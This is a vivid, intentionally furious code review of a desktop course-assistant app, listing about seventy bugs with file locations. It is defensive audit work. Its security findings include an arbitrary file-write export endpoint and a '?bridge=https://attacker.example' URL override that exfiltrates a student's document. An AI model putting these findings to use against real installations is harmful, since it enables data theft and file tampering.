# Code Review — a furious one

> Implementation update, 2026-10-04: the original review is retained for retesting.
> [docket.md](./docket.md) holds all 71 findings with individual current statuses,
> regression evidence and remaining acceptance checks. **Fixed in code — awaiting
> verification** is not user-verified closure. The prose below describes the
> originally reviewed version, not the current implementation. AR-63 and AR-70
> are cleared review claims, retained for verification of that assessment.

*Reviewer mood: apoplectic. Do not make eye contact with this diff.*

GRR. I have read this entire... *thing*... back to front, and I want everyone
responsible to know that I have lost entire afternoons to it. This is a
**local desktop study tool** — a course assistant with a SQLite file and a
chat box — and somehow it contains the error handling of a falling elevator,
the concurrency of a food fight, and no fewer than **seventy-odd live defects**
across four languages.

Let me be clear about what this document is: it is the *review*. The flames.
The "who approved this" energy. The **actionable, tracked bugs** — every single
one, with file, line, failure scenario, and severity — live in
[`docket.md`](./docket.md). This file is where I get to be *angry* about them.
If you want to fix things, read the docket. If you want to understand why my
eye is twitching, stay here.

I counted. I hunted. I kept going after I thought I was done, precisely because
somebody will yell at me for the one I missed and that will make me *even more
enraged*. So here is the full accounting.

---

## 0. The overall verdict

There is real, serious engineering in here. I can see it. The retrieval funnel
has good math. The storage seam is genuinely careful — streaming hashes, atomic
writes, a decompression ceiling, sanitized display names. The `db.py` module is
one of the more disciplined things I have read this week. Someone, at some
point, *cared*.

And then someone else came along and put a **generic file-overwrite primitive**
in the artifacts API, made a quiz request **crash the server** if you ask for
too many questions, and wired the practice "try again" button to **mark every
answer as cheating**. The quality bar is a seismograph. It is *everywhere*.

Rough tally of what I found, before we descend into the individual horrors:

| Layer | Problems | Worst offender |
| --- | --- | --- |
| API layer | 11 | export writes to any path you hand it |
| Ingest / RAG / retrieval / graph | 8 | a 2-page OCR hiccup nukes a 50-page PDF |
| Tutor / artifacts / evals / student model | 17 | `calls[-1]` on an empty list = 500 |
| Runtime / Office / backups / core | 15 | download failure = model dead "starting" forever |
| Frontend (Svelte) / Rust / scripts / CI | 20 | "try again" marks every quiz answer as helped |
| **Total** | **~71** | *loud, guttural screaming* |

Let us walk through the wreck in order.

---

## 1. The API layer, where requests go to die with the wrong status code

I want to start with my *favorite*, because it is a masterclass in writing a
function that documents a rule and then immediately breaks it.

### 1.1 Export is an arbitrary file writer. GRR.

`POST /courses/{id}/artifacts/{aid}/export`. You hand it a `path`. It writes
the artifact bytes to that path. **Any path.** `api/artifacts.py:557-562`.
There is no containment. No allowlist. Nothing. The *only* checks are "does
the parent folder exist" and a suffix match that — and I had to read this twice
to believe it — **appends** the extension on mismatch. Send `notes.txt` for a
`py` export and it cheerfully writes `notes.txt.py`.

Compare this to `api/data.py:156-172`, which bends over backwards to say "this
is *not* a general file opener" and confines reveals to the data and export
folders. The export endpoint looked at that caution, laughed, and became a
general file *writer*. The no-path branch even calls `unique_path()` to avoid
clobbering anything. The explicit-path branch just... `target.write_bytes(data)`.
Overwrites whatever is there. 200 OK.

Any holder of the app token — a malicious local process, an XSS in the webview,
a bored sibling — gets a "write arbitrary bytes to an arbitrary location"
button. This is not a nitpick. This is the sort of finding that ends up in the
section of a report titled "Recommendation: do not ship this."

### 1.2 Make a 50-question quiz. I dare you. It throws `IndexError`.

`src/backend/tutor/answer.py:300` does `last = calls[-1]`. The list `calls`
is created empty at line 147 and only ever appended inside the `generate`
wrapper at line 180. Now go read `compose_answer` in `tutor/compose.py:878-885`:
when you ask for a quiz with a count outside 1–20, it returns a polite canned
message — *"A practice test supports 1–20 questions"* — **without ever calling
`generate`**.

So: "make me a 50-question quiz" → early return → `calls` is still `[]` →
`calls[-1]` → **`IndexError: list index out of range`** → HTTP 500. The
carefully-worded helpful message is *right there* and the request never returns
it, because the code immediately falls over. This is a **high-severity crash
triggered by a normal thing a student types**. Whoever wrote the early return
and whoever wrote `calls[-1]` have clearly never been in the same room. GRR.

### 1.3 The status codes are just... made up.

A sample of the damage:

- **`API-1` / learning.py:106-137** — a stored quiz question whose prompt or
  explanation exceeds 5000 chars (perfectly legal when *created* — `QuizQuestion`
  has no `max_length`) blows up `PracticeQuestion` validation (which caps at
  5000) with no `try`, returning **500** instead of 4xx. The `except ValueError`
  two lines below covers `create_suite` and *nothing else*. It's a safety net
  with a hole cut in the bottom.
- **`API-3` / sources.py:185-220** — the stored `.bin` is missing or corrupt on
  disk? `GET .../content` and `.../pages/1` return **500**, not 404/410. The
  endpoint's own docstring says a failed source "must never be silent" — and
  then its own read path explodes into a 500. Delicious.
- **`API-5` / learning.py:207-218** — monthly budget exhausted (a *designed,
  expected state*) → practice help returns **500** instead of 402. Every
  sibling endpoint maps `BudgetExceededError` to 402. This one just... doesn't.
- **`API-4` / office_setup.py:72-77** — `connect_office` catches
  `OfficeSetupError` but the code path raises bare `OSError` and `ValueError`.
  The code *knows* this: `disconnect_office` two lines down deliberately catches
  `OSError`. 500 instead of 409.
- **`API-8` / office.py:463-471** — wraps a `raise HTTPException(422, "not valid
  base64")` in `except Exception` and re-labels it *"The Office document could
  not be read."* You deliberately produced a precise error message and then
  threw it in the trash. GRR.

### 1.4 `deps.py` is fine and I am *annoyed* about it

The token comparison is constant-time (`hmac.compare_digest`), the dev/prod
fallback is correct, and app-level auth genuinely covers every router in
`create_api()`. I *tried* to find a hole here and I couldn't, and now I'm in a
bad mood because I wanted something to be furious about and instead I have to
say something nice. Ugh.

(One genuine gripe: `/health` is mounted *inside* `create_api()`, so it sits
behind `require_app_token`. A health probe that needs a secret isn't a health
probe. But it's a deliberate tension with the security model, so it lives in the
docket as a decision, not a bug. FINE.)

---

## 2. Ingestion, or "how to lose a 50-page document over 2 blank pages"

The retrieval and segmentation math is genuinely well built. I checked the
chunking tiling, the overlap bounds, the `fuse` largest-remainder quota, the
vector normalization — all clean. And then I looked at the *error handling
around* that good code and found a dumpster.

### 2.1 `ING-2` — one flaky OCR call fails the WHOLE source.

`orchestrator.py:138-174`. `_ocr_weak_pages` catches **only**
`provider.ProviderUnavailableError`. But `split_ocr_pages` raises **`ValueError`**
when the vision model returns a different number of page-boundaries than images
— and it *will*, because models love to append a trailing `"\n\n---\n\n"`.

So: a PDF with 50 good text pages and 2 blanks. OCR is flagged for the 2 blank
pages. The model adds a trailing separator. `split_ocr_pages` sees 3 parts for 2
images → `ValueError` → **not caught** → both retry attempts fail *identically*
(while re-billing the vision model, thanks) → `IngestionPipelineError` → the
**entire source is marked failed and not indexed**. Fifty of fifty-two pages had
usable text. Gone. The function's own contract says *"a mixed PDF must still
index."* It does not. This is a **medium** that behaves like a critical any time
someone uploads a scan with clean text on most pages. GRR.

### 2.2 `ING-3` — retry the un-retryable, in a hot loop, with zero backoff.

`pipeline.py:66-85` retries *every* `Exception` up to `max_attempts` in a tight
loop. No sleep. No classification. That includes guaranteed-failure errors like
`UnsupportedSourceTypeError` and `EmptyExtractionError`, and the `ValueError`
from §2.1. A 200 MB corrupt PDF gets fully re-parsed on attempt two just to fail
the same way. A transient outage gets hammered with no backoff. And the run
ledger says *"failed after 2 attempts"*, which actively lies about it being
transient. Great. Love it.

### 2.3 `ING-4` — OCR text spliced onto the *wrong pages*.

`orchestrator.py:171-173` pairs recognitions with `indexes[:len(recognized)]`
— the *first N* flagged page indexes. But `recognized` is aligned with the pages
`rasterize_pages` *actually rendered*, which silently **filters out-of-range
indexes**. If the filtered-out page isn't last, every later recognition lands on
the wrong page. pypdf says 401 pages, pdfium says 399, and suddenly page 400's
text layer contains page 3's OCR and page 3 contains page 5's. **Silent, permanent
miscitation.** The fix is to zip against the rendered list, not the requested one.

### 2.4 The text decoders are all slightly broken.

- **`ING-5` / extract.py:239-245** — the NUL-density "is this binary?" heuristic
  `sample.count(b"\x00") > len(sample) / 10` fires on *short* files. A 3-byte
  file with one stray NUL is rejected as "binary" while the identical content
  padded with more text is happily accepted and NUL-stripped. The documented
  behavior is "drop NULs"; the code sometimes screams and runs away instead.
- **`ING-6` / extract.py:262-270** — the cp1252 fallback uses `errors="strict"`,
  and cp1252 *rejects* `0x81 0x8D 0x8F 0x90 0x9D`. So the exact legacy bytes
  this fallback exists to cover crash it. Use `latin-1`/`replace` and be done.
- **`ING-7` / extract.py:347-351** — a whitespace-only preamble gets **no
  locator at all** (`if text[:first_start].strip()`), so those characters are
  unaddressable and citations near the top of a file point at the *next*
  section. The function's docstring literally promises *"every character stays
  addressable."* It does not. UGH.

### 2.5 `ING-1` — the graph silently forgets edges on every re-ingest.

`graph/edges.py:144-164`. `build_source_edges` deletes **all** edges touching a
source's chunks, then only recreates pairs where *this* source's chunk lists the
partner in *its own* top-k. A full rebuild keeps a pair when *either* side lists
the other. So an edge created from the other endpoint's top-k is deleted and
never reborn. Re-ingest a source with unchanged text (IDs reused) and the
relation vanishes from `similar_candidates` and `course_graph` until someone runs
a manual full rebuild. Silent derived-data loss, degrading retrieval, every
re-ingest. **`ING-8`** is its cousin: the vector-dimension guard reads the
dimension from `rows[0]` (arbitrary!) instead of the configured model dimension,
so a same-name model swap can rank from a stale vector space. Nngh.

---

## 3. Tutor, artifacts, and the "generation" house of cards

### 3.1 `TUT-2` — the evidence is the wrong chunk. HIGH. I am unwell.

Workspace quiz items number their `sources`/`[n]` against the **full candidate
list** (compose.py gates this correctly with `len(candidates)`). But
`Answer.__init__` (answer.py:303-304) re-gates with
`extract_workspace_items(self.text, len(chunk_ids))` where `chunk_ids` is only
the **prose-cited subset**, and `learning.create_suite` then treats
`question.sources` as indexes into *that subset*.

Result, two ways:

1. 12 chunks retrieved, prose cites `[2]`, quiz cites `[3]` (a perfectly valid
   material number). `chunk_ids = (c2,)` → gate sees `material_count=1` →
   *"cites [3] but only material [1] was provided"* → the quiz is **wrongly
   withheld**.
2. Worse: quiz cites `[1]`, gate passes, `create_suite` records evidence
   `chunk_ids[0] = c2` — **the wrong chunk**. Later practice help grounds its
   explanations in the wrong passage. Silent. Corrupting. HIGH.

### 3.2 `TUT-3` — cite nothing, get credited with citing everything.

`answer.py:303`: `chunk_ids = tuple(cited) or tuple(all candidates)`. A model
that returns prose with no `[n]` markers (small models do this *constantly*) is
recorded as having cited **every retrieved chunk**. That inflated evidence set is
cached, fed to the learning model, and stamped on teaching events. The module
docstring says "the chunk list is the ones it cited." The code says "or all of
them, whatever." GRR.

### 3.3 `ED-1` — the "protect the student's own words" rule is DEAD CODE.

`artifacts/edit.py:312,333` + `attribution.py:78-103`. For slides, `before` is
a `json.dumps(shown)`. Slide body lines **never appear as whole lines** of that
JSON dump, so `existing = {line.strip() for line in before.splitlines()}` can
never match them. `strip_echo`'s only guard — "a line already in `before` is
never removed" — never fires. So a student's pasted 3-line definition gets
classified as "pasted material echo" and **deleted from the proposal**. They
click accept, and their content is gone. The entire protective rule is an
optical illusion. This one is going in the docket at **medium-high** because it
destroys user work.

### 3.4 `COMP-1`, `COMP-2`, `COMP-3` — swallowing errors and nuking good answers.

- **`COMP-1` / compose.py:968-970** — the quiz-repair loop does
  `except Exception: if not on_schema_rejected(err): repaired = ""`. Anything
  that *isn't* a schema rejection — network died, model truncated, budget blew —
  becomes `""` and the student is told *"I couldn't create a trustworthy quiz."*
  The two sibling handlers 50 lines away correctly re-raise. Outage now
  invisible to monitoring. GRR.
- **`COMP-2` / compose.py:901 + citations.py:85-88** — an answer containing
  `arr[0]` in prose (or a reversed range `[5-3]`, which `marker_numbers`
  mangles into `{0,5,3}`) throws away a *completely correct* answer and replaces
  it with "the answer referred to material it was not given." The workspace path
  explicitly avoids this trap; the prose path charges right into it.
- **`COMP-3` / compose.py:1081-1091 + quotes.py:136-137** — quote-mode fallbacks
  skip the out-of-range check entirely, so a dangling `[99]` sails into the body.

### 3.5 The eval scorer rejects the markers production writes. (`EVAL-1`)

`evals/answer.py:67` uses `re.compile(r"\[(\d+)\]")` — single numbers only. But
quote mode's `anchor_citations` deliberately emits comma-joined `[1, 2]`, and
`citations.py` accepts `[1-3]` ranges. **Neither matches.** So `green_grounded`
cases falsely fail because "no citations present," and the eval harness — which
gates prompt changes — is quietly lying to you. Inverse problem in `EVAL-2`:
the fabrication check scans citation markers as if they were facts, so a refusal
citing `[104]` in a 100+ chunk course scores as "fabricated specifics." Who
reviews the reviewers? Nobody, apparently.

### 3.6 Assorted tutor wounds

- **`WORK-1` / work.py:227** — `(?<!D)\[(\d+)\]` lookbehind drops real citations
  ("vitamin D[2]" loses `[2]`) for a `[D1]` case the regex can't match anyway.
  Beautifully pointless and wrong.
- **`QUOTE-1` / quotes.py:58** — `position = found + 1` lets ellipsis segments
  overlap, so words get counted twice and a quote the passage doesn't support
  "verifies."
- **`OFF-1` / office.py:252-269** — Office answers never validate `[n]` markers
  and return *every* candidate as a citation regardless of what was cited.
- **`PS-1` / practice_support.py:253-261** — the visibility check is blind to
  `[1, 2]` grouped markers, then re-appends duplicate "Sources: [1] [2]" tails.
- **`LEARN-1` / learning.py:71-82** — the idempotent fallback compares
  `r["origin"] == origin`, but `origin` embeds raw `datetime`/`UUID` serialized
  with `default=str`. Dict equality can never hold. Duplicate retries raise
  instead of returning the existing suite.
- **`CHAT-1` / chat.py:257** — the rolling summary is built from un-stripped
  model output, so a fence echo eats the 1200-char summary budget.
- **`RES-1` / research.py:124** — `except Exception` logs *nothing* (`no
  exc_info`), so a `$defs` schema change silently halts experiment creation
  forever and the log can't tell "provider down" from "code bug."

---

## 4. Runtime, Office, and backups — processes and files, oh no

### 4.1 `RUN-1` — a failed download bricks the model launcher. HIGH.

`runtime/server.py:217-233`. `LlamaServer.start()` catches **only**
`(RuntimeUnavailableError, OSError)`. But `ensure_binary` → `download_verified`
raises `DownloadError` / `DownloadCancelled` (plain `RuntimeError` subclasses)
and raw `httpx.HTTPError`. Not caught. So a checksum mismatch or timeout:

- escapes `start()` past the per-key `continue` → the Vulkan→CPU **fallback
  never runs**;
- blows through `_ensure_local_runtime` unconverted → the API returns a raw
  error instead of *"download it or pick another model"*;
- leaves `self._state == "starting"` and `_error == None` **forever** →
  `status()` reports "starting" indefinitely and `check_and_restart` (which
  needs `state == "running"`) never recovers.

The server is now a zombie that says "starting" until you restart the app. HIGH.

### 4.2 `SUP-1` — one stray exception murders the supervisor AND stops your model.

`runtime/supervisor.py:38-46`. The loop has no exception guard around
`check_and_restart`. Anything non-`RuntimeUnavailableError` — `sqlite3.
OperationalError: database is locked`, a `ValidationError` from a corrupt
`user_models` row, the `DownloadError` from §4.1 — propagates out of
`run_forever`, and the `finally` block **stops the local model** and the
supervisor is dead for the rest of the session. A transient DB hiccup during a
crash-restart silently ends model supervision *and* turns your model off. GRR.

### 4.3 `RUN-2` / `RUN-3` — the concurrency is a knife fight.

- **`RUN-2` / server.py:322-344** — `check_and_restart` reads the model under
  the lock, releases, then calls `start()` *outside* it. `start()` holds the
  lock for its entire multi-second health wait. So: server crashes on model A →
  supervisor queues `start(A)` → user picks model B → `start(B)` runs to healthy
  → the queued `start(A)` then **stops B and relaunches A**. The user's explicit
  choice is silently reverted to the crashed model. Medium.
- **`RUN-3` / server.py:430-437** — `ensure_running` is check-then-act with no
  lock on the status read. Two concurrent requests both see "not running," both
  call `start()`, and the second one **kills the healthy server the first just
  brought up** and re-runs launch + health wait. Under load the model stops and
  starts for no reason and in-flight generations get connection-refused. Medium.

### 4.4 `RUN-4` — the health check trusts *anyone* on the port.

`server.py:284-301` treats *any* HTTP 200 from `127.0.0.1:{port}/health` as
proof *our* llama-server is healthy. If another process (the user's own
llama.cpp, LM Studio, a stale server with no pidfile) owns the port, our child
dies but the foreign server answers the probe → `start()` reports "running" with
a **dead child**, and `generate` talks to someone else's model. Then restarts
loop until "keeps crashing," never mentioning the real cause. Low, but *rude*.

### 4.5 Provider and core — a pile of papercuts with teeth.

- **`PRV-1` / provider.py:473-475** — `int(usage.get("prompt_tokens", 0))`.
  When the provider sends `"prompt_tokens": null`, `.get` returns `None` (key
  present!), `int(None)` → `TypeError` → the whole *successful* completion is
  reported as "a reply Stacks could not read," while the usage ledger already
  recorded it. The *earlier* parse at 407-409 handles this correctly with `or 0`.
  Two parses of the same field, one correct, one broken. Just inconsistent. GRR.
- **`PRV-2` / provider.py:371-378** — `httpx.post(...)` with **no
  `follow_redirects=True`** (downloads.py and user_models both set it). A 3xx
  passes the `< 400` "success" gate, then `response.json()` on the redirect body
  → "unreadable reply." Self-hosted endpoints behind proxies are exactly where
  this bites.
- **`COM-ARC-1` / course_archive.py:150-153** — course export **crashes** on a
  legacy source with NULL `file_hash` (`sha256` pattern won't accept None),
  leaving the course permanently unexportable — while the *backup* path handles
  the same rows fine with a COALESCE. Pick one!
- **`OPR-PKG-1` / office_reader/package.py:99-110** — a legitimate `.xlsx` with
  a chart sheet or macrosheet is rejected outright ("ordering references a
  missing part"). Valid workbook, zero extraction. Fail-closed on good input.
- **`COM-SEC-1` / providers.py:295-314** — the API key is deleted from the
  keychain *before* the DB transaction commits. Commit fails → row survives,
  key gone, endpoint dead with no record of why.
- **`RUN-5` / user_models.py:125** — `entry["size"]` bare `KeyError` on a
  malformed HF response → 500 with a raw traceback instead of a friendly
  message.

### 4.6 Office add-in and the host — low, but unsettling.

- **`OPA-5.1` / office-addin bridge.js:13-16** — `?bridge=` query override with
  **no allowlist**. Open the pane with `?bridge=https://attacker.example` and it
  will POST the student's *entire document content* to that origin. Low
  (requires getting the user to open a crafted URL) but it's an exfil path.
- **`OPA-HST-1` / host.py:114-126** — loopback sockets bound without
  `SO_REUSEADDR` on POSIX, so the documented cert-renewal restart fails in
  TIME_WAIT with a misleading "port in use" error.
- **`OPA-HST-2` / host.py:82-95** — the 5-second stop deadline `raise`s and
  *skips* cleanup (`live.BROKER.clear()`, cert/manifest deletion), and the
  `start()` cleanup path can raise and **replace the original** startup
  exception. Two bugs wearing a trenchcoat.
- **`OPA-WIN-1` / windows.py:78-98** — `certutil` with **no timeout** (macOS
  path uses 30s). `certutil -addstore` pops an interactive dialog; nobody
  answers → the API worker thread **blocks forever**.

---

## 5. Frontend, Rust, scripts, and CI — the cherry on this sundae of despair

### 5.1 `FE-1.2` — "Try again" marks every quiz answer as "I used help." HIGH.

`src/frontend/src/lib/stores/practice.svelte.ts:131`. The constructor sets
`this.helped = questions.map(() => false)` — correct. `reset()` — the "Try
again" button — sets `this.helped = questions.map(() => **true**)`. Every. Single.
One. That array is submitted verbatim, and it drives "assisted answers don't
count as independent practice." So a student who retook a quiz is recorded as
having cheated on all of it, `independent_items` never accrues, and the
course-memory proficiency estimate is **systematically corrupted**. The test
suite never exercises `reset()` after a completed run, which is how this shipped.
Copy-paste error, maximum damage. HIGH.

### 5.2 `FE-1.1` — the companion UI permanently wedges. HIGH.

`WorkCompanion.svelte:302-323`. `busy = true` is set before an `await`, and
every exit path only clears it `if (current(token))`. Switch session or course
mid-request (the selects aren't even disabled) → `epoch` increments →
`current(token)` false → **bare `return` with `busy` stuck `true` forever**.
Every button disabled. "Working…" until you close the window. Same leak in
`operation()` and `removeSession()`.

### 5.3 The state layer is fighting Svelte 5 and losing.

- **`FE-1.5` / chat.svelte.ts:176-182** — `this.turns = turns` proxies the array,
  but `loadCitations` is then called on the **raw** turn objects. Writes to raw
  objects don't bump Svelte 5 proxy sources → citations **never render** for
  saved conversations. Works fine for *newly sent* turns (which are already
  proxied), which is exactly why it survived testing. GRR.
- **`FE-1.6` / QuizArtifact.svelte:20-24** — `$derived(new QuizSession{...})`
  spreads every question, so it's invalidated by *any* edit. Flip to "Edit
  questions" and back → brand-new session: answers gone, run gone, and a **new
  server-side suite** created each cycle. Data loss plus orphaned runs.
- **`FE-1.7` / artifacts/[artifactId]/+page.svelte:59-62** — `onDestroy` calls
  `open.dispose()` (sets `destroyed = true`) **then** `open.flush()`, and `save()`
  early-returns when `destroyed`. The unmount save is a **no-op**. Swapping two
  lines fixes it.

### 5.4 Connection handling is stale and half-recovered.

- **`FE-1.3` / backend.ts:59-71** — backup activation resets `origin`/`token`
  and only reconnects **on success**. But the Rust side *always* restarts the
  backend, even on failure (returning a healthy backend on a new port). So a
  failed activation leaves `apiBase()` returning the relative `"/api"`, and every
  subsequent request goes to `http://tauri.localhost/api/...` and dies. Healthy
  backend, dead app, no recovery except quitting.
- **`FE-1.4` / client.ts:53-61** — `createClient({ baseUrl: apiBase() })` caches
  the URL **forever**; `activateBackup` documents "forget the cached connection"
  and then doesn't. Reconnects hit the old, dead port. (`DebugHost` and the
  source viewer call `apiBase()` per request and are fine — inconsistent.)
- **`RUST-2.1` / library.rs:47-69** — if the post-activation respawn fails, the
  managed `BackendCell` is already `None` and *stays* `None` forever →
  "the backend is restarting" permanently, with the successful library swap
  hidden behind a misleading error.

### 5.5 Small stuff that still made me scowl.

- **`FE-1.8` / SheetView.svelte:24** — `revokeObjectURL` called synchronously,
  canceling the CSV download. `EditableDocument` does the same thing but delays
  it 2s *with a comment explaining why*. Read your own comments!
- **`FE-1.9` / SlidesEditor.svelte:41** — `requestFullscreen?.().catch()`: if
  the method is absent, `?.()` is `undefined` and `.catch` throws `TypeError`.
- **`FE-2.2` / library.rs:49-58** — the `BackendCell` mutex is held across a
  20-second blocking shutdown; the whole UI stalls.
- **`SCRIPT-3.1–3.3` / eval_passages.py, freeze_constraints.py** — cumulative
  timer reported as per-case, `text.index()` + two `ZeroDivisionError` paths, and
  a requirement-name parser that chokes on `!=` / `<=` / `===` / `@` pins so
  `constraints.txt` can't be regenerated. All low, all annoying.
- **`SCRIPT-3.4` / run.sh:6-13** — accepts a *Windows* venv layout on macOS/Linux,
  then the Rust launcher looks for `.venv/bin/python` and fails at startup.

### 5.6 CI — the release build ignores the very constraints that exist for it.

**`CI-4.1` / release.yml:61 + release-macos-linux.yml:107.** Every CI install
uses `-c constraints.txt`. The **release** jobs run `pip install -e ".[desktop]"`
— **no constraint flag** — and skip `freeze_constraints --check`. The
`constraints.txt` header literally says its purpose is so *"a release cannot drift
silently."* So CI tests the pinned stack and the release ships the unpinned one.
A breaking transitive patch on tag day and you build installers against untested
deps. The `desktop` extra is unpinned too. Medium, and embarrassing, because the
comment explains the rule three files away from where it's broken.

- **`CI-4.2`** — release pip cache key omits `constraints.txt` (ci.yml includes
  it). Low.
- **`CI-4.3`** — `ruff check .` lints the whole tree (including scratch archives
  and local build output) while `ruff format --check`/`mypy` are scoped to
  `src/backend scripts tests` / `src`. No `[tool.ruff] exclude`. Low.

---

## 6. What is actually GOOD (so you know I looked)

Because I am *fair*, when I am not furious:

- **`storage.py`** is genuinely careful: streaming SHA-256, bounded temp files,
  atomic `replace()`, a real decompression ceiling, staging-debris filtering,
  and display-name sanitization that even handles the Postgres-NUL landmine.
- **`db.py`** is disciplined: single seam, `foreign_keys=ON`, WAL, `IMMEDIATE`
  transactions to dodge lock-upgrade deadlock, consistent timestamp format.
- **`deps.py`** auth is constant-time and correctly scoped.
- **The retrieval funnel, segmentation, and `fuse` quota math** are correct — I
  checked the tiling, overlap bounds, and largest-remainder allocation by hand.
- **`backups.py` restore** is structurally zip-slip-proof (forced member paths),
  verifies member hashes before publication, caps expansion, and uses an atomic
  staging rename. Good work. (Its sibling `course_archive.py` should take notes.)
- **XSS** in the Svelte app is handled: all four `{@html}` sites go through
  DOMPurify or are static. The Office pane uses `textContent` throughout.
- **No command injection** in the Rust shell — `Command::arg`, validated IDs.
- The launch token is never logged.

These are not accidents. Someone knew what they were doing. Which makes the
seventy-odd holes *more* infuriating, not less, because the talent is *right
there*.

---

## 7. Where to go from here

1. **Read [`docket.md`](./docket.md).** Every bug above — and the ones I crammed
   into the tables without prose — is listed there with file:line, a concrete
   failure scenario, and a severity. That is the work queue. Not this file.
2. **Fix the HIGHs first**, in roughly this order, because they lose user data or
   crash the server on normal input:
   - `AR-01` quiz-count `IndexError` (500 on "50 questions")
   - `AR-02` workspace-citation evidence points at the wrong chunk
   - `AR-03` export is an arbitrary-file-overwrite primitive
   - `AR-04` practice `reset()` marks every answer "helped"
   - `AR-05` companion `busy` wedges the UI
   - `AR-06`/`AR-07` download-failure bricks the runtime + supervisor
   - `AR-08` slide-edit protection silently deletes student content
3. **Then the mediums** that lose data or lie about state: `ING-2` (whole-source
   loss), `TUT-3` (fake citations), `FE-1.5`/`FE-1.6` (Svelte state), the
   runtime races (`RUN-2`/`RUN-3`), and `CI-4.1` (unconstrained release).
4. **Then the great status-code sweep.** I want a single audit where every
   handler that can raise maps it to the right 4xx, and no endpoint returns 500
   for a state the app *designed* to occur (missing file, blown budget, bad
   keyring, out-of-range quiz).

And for the love of all that is holy: **stop catching `Exception` and throwing
away the error.** I counted at least six places that swallow an exception, lose
the message, and report something false to the user or to the logs (`COMP-1`,
`RES-1`, `API-8`, `SUP-1`'s cousin, the quiz repair, the Office read merge).
Every one of them turns a diagnosable problem into a mystery. GRR.

---

*Signed,*
*A reviewer who read every line and is now going to lie down in a dark room.*

*(The bugs are in [`docket.md`](./docket.md). Go fix them. Quietly.)*
